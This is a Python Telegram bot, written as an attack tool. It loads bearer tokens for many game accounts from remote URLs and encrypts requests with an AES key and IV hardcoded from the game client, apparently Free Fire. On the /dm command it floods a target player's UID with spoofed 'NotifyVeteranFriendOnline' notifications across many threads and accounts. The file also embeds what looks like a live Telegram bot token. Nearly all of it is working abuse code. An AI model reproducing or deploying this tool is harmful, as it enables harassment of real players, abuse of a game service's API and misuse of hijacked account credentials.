import requests
import threading
import time
import random
import hashlib
import json

import requests
import threading
import time
import random
import hashlib
import json
import os
import asyncio
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes


class AdvancedAttackSystem:
    def __init__(self):
        self.tokens = []
  
        
        
        
        
        self.api_urls = [
            "https://r1-acc-jwt.vercel.app/2a97793c9079a6d0d2c59c0f7a2aff3ec5618fca6edb870dc839c37ab35039d4",
            "https://r1-acc-jwt.vercel.app/84fa005d5dbb93f12b58eb15e9aa7066732d91ccfd5c4af42cf4a2623c72f623",
            "https://r1-acc-jwt.vercel.app/55276a7c417834bef7de7f2777cde089b177671d7514dce7cd966e0a71a12281",
            "https://r1-acc-jwt.vercel.app/c008f4c8f0de93f31eae737a52b04179342deb66306ac76782fdc4636119284b",
            "https://r1-acc-jwt.vercel.app/3b80c9ef39e684388a2c9eab7cbb19a6d94bf4b8f608be31a091aa3977487817",
            "https://r1-acc-jwt.vercel.app/05eabfefbfb6ed2afeba2d23f3e1d022f9ef5f753bce5bd9f0de6a1dcecc79f8",
            "https://r1-acc-jwt.vercel.app/414dd5e5235cf0d4e45c17244f4af700ccb2ee4f27e9deacf27a5ca56aa291cb",
            "https://r1-acc-jwt.vercel.app/e9a8ab9267cbae4544d2eb3aa26c2047ba1a3c03a5d0e4ef7db63f56f5b740f2",
            "https://r1-acc-jwt.vercel.app/49fbc72f2a48a350e3e0088c107e21a0ca3788f2a54cfdc91eb9b2a8a12131d8",
            "https://r1-acc-jwt.vercel.app/09fdcaa424f636eb64eaaec0f86e72c23b0be67aed9ebceeecfefddbf8646dfd",
            "https://r1-acc-jwt.vercel.app/62312620e25beccad559cbcf2e31399a759aadf494a6b0f09834be45af856c54",
            "https://r1-acc-jwt.vercel.app/e1a979ae24366a79130c437e7953ce79756b6412c2b37cb9e560402ceba4893b",
            "https://r1-acc-jwt.vercel.app/2fda8a4401eaf0fc71ebc2d534441de95c100be8e218b2141b331b2238280fde",
            "https://r1-acc-jwt.vercel.app/975ea16d5615dbaaa65ffc42d260b105de15493fc3e53452dc30a7fe654bf3d6",
            "https://r1-acc-jwt.vercel.app/97817559bda08696f984a72f0a411129b641c598440a61787916df7150bacd92",
            "https://r1-acc-jwt.vercel.app/b19ee0beb6548c369e0c30f7e51216efb8bbb8d813d35bc6232dda2074d31eb0",
            "https://r1-acc-jwt.vercel.app/20b117de0b2d84670c05f2bd6b8072c6d4c32035e858053882073dfad367b76c",

            "https://r1-acc-jwt.vercel.app/c8b23f36bbeb2e0719f15feb8f059f05875d994f863c824f0bc42aac1a90b715"
        
        
        
        ]
        self.load_tokens_auto( )

    def load_tokens_auto(self):
        print("--- Loading Tokens ---")
        for url in self.api_urls:
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    token_data = response.json()
                    if token_data.get("success") is True and "BearerAuth" in token_data:
                        self.tokens.append(token_data["BearerAuth"])
                        print(f"  [SUCCESS] Loaded token!")
                else:
                    print(f"  [FAIL] Status {response.status_code} for {url}")
            except Exception as e:
                print(f"  [ERROR] Exception for {url}: {e}")
        print(f"--- Total Tokens Loaded: {len(self.tokens)} ---\n")


    def get_random_token(self):
        return random.choice(self.tokens) if self.tokens else None

    def encrypt_id(self, number):
        number = int(number)
        encoded_bytes = []
        while True:
            byte = number & 0x7F
            number >>= 7
            if number: byte |= 0x80
            encoded_bytes.append(byte)
            if not number: break
        return bytes(encoded_bytes).hex()

    def encrypt_api(self, plain_text):
        plain_text = bytes.fromhex(plain_text)
        key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
        iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.encrypt(pad(plain_text, AES.block_size)).hex()

    def send_request(self, session, target_id, token):
        try:
            iddd = "0a" + self.encrypt_id(len(target_id) // 2) + self.encrypt_id(target_id)
            encrypted_data = self.encrypt_api(iddd)
            headers = {
                "Content-Type": "application/x-www-form-urlencoded", "X-GA": "v1 1", "ReleaseVersion": "OB51",
                "Host": "clientbp.ggwhitehawk.com", "Accept-Encoding": "gzip",
                "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android {random.randint(9, 13)}; SM-G9{random.randint(8,9)}N Build/TP1A.220624.014)",
                "Connection": "keep-alive", "Authorization": f"Bearer {token}", "X-Unity-Version": "2018.4.11f1",
                "X-Device-ID": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                "X-Platform": "android", "X-App-Version": str(random.randint(100000, 999999))
            }
            session.post("https://clientbp.ggwhitehawk.com/NotifyVeteranFriendOnline", headers=headers, data=bytes.fromhex(encrypted_data ), timeout=2)
        except Exception:
            pass

    def wave_worker(self, target_id, stop_event, tokens_for_wave):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
        session.mount('https://', adapter )
        
        while not stop_event.is_set():
            
            pulse_end_time = time.time() + 3 
            while time.time() < pulse_end_time and not stop_event.is_set():
                token = random.choice(tokens_for_wave)
                self.send_request(session, target_id, token)
                time.sleep(1) 
            
            
            if not stop_event.is_set():
                time.sleep(0.1) 

    def start_storm_attack(self, target_id, num_waves=5):
        if not self.tokens:
            return None, None

        stop_event = threading.Event()
        all_threads = []
        
        
        tokens_per_wave = max(1, len(self.tokens) // num_waves)
        wave_token_sets = [self.tokens[i:i + tokens_per_wave] for i in range(0, len(self.tokens), tokens_per_wave)]

        print(f"Unleashing the storm: {num_waves} waves, {len(self.tokens)} total accounts.")

        for i, token_set in enumerate(wave_token_sets):
            if not token_set: continue
            
            
            wave_thread = threading.Thread(target=self.wave_worker, args=(target_id, stop_event, token_set), daemon=True)
            all_threads.append(wave_thread)
            wave_thread.start()
            print(f"  -> Wave {i+1} launched...")
            time.sleep(0.8) 

        return stop_event, all_threads

class TelegramAttackBot:
    def __init__(self, token):
        self.attack_system = AdvancedAttackSystem()
        self.active_attacks = {}
        self.app = Application.builder().token(token).build()
        self.setup_handlers()

    def setup_handlers(self):
        self.app.add_handler(CommandHandler("dm", self.dm))
        self.app.add_handler(CommandHandler("remove", self.remove_attack))

    async def dm(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /dm UID")
            return
        
        target_id = context.args[0]
        if not self.attack_system.tokens:
            await update.message.reply_text("خطأ: لم يتم تحميل أي حسابات. لا يمكن بدء الهجوم.")
            return
        
        if target_id in self.active_attacks:
            await update.message.reply_text(f"المقبرة مستمرة بالفعل على: {target_id}")
            return
        
        
        
        num_waves = min(len(self.attack_system.tokens), 200) 
        stop_event, threads = self.attack_system.start_storm_attack(target_id, num_waves=num_waves)
        
        if not threads:
            await update.message.reply_text("فشل في بدء الهجوم.")
            return

        self.active_attacks[target_id] = {"stop_event": stop_event, "threads": threads}
        await update.message.reply_text(f"done {len(threads)} {target_id}")

    async def remove_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /remove UID")
            return
        
        target_id = context.args[0]
        if target_id in self.active_attacks:
            print(f"Stopping attack on {target_id}...")
            self.active_attacks[target_id]["stop_event"].set()
            for thread in self.active_attacks[target_id]["threads"]:
                thread.join(timeout=2)
            
            del self.active_attacks[target_id]
            await update.message.reply_text(f"stop for {target_id}")
            print("Attack stopped.")
        else:
            await update.message.reply_text(f"لا يوجد هجوم فعال على {target_id}")

    def run(self):
        if not self.attack_system.tokens:
            print("CRITICAL: No tokens loaded. Bot will start but cannot attack.")
        print("Bot is running...")
        self.app.run_polling()

if __name__ == "__main__":
    BOT_TOKEN = "8472861370:AAF6QJZV8_R6GRpBq5ziQzvxYqX4WWDPC-E"
    
    if not BOT_TOKEN or "YOUR_TOKEN" in BOT_TOKEN:
        print("Error: Please set your Telegram bot token in the script.")
    else:
        try:
            
            bot = TelegramAttackBot(BOT_TOKEN)
            bot.run()
        except Exception as e:
            print(f"An error occurred during startup: {e}")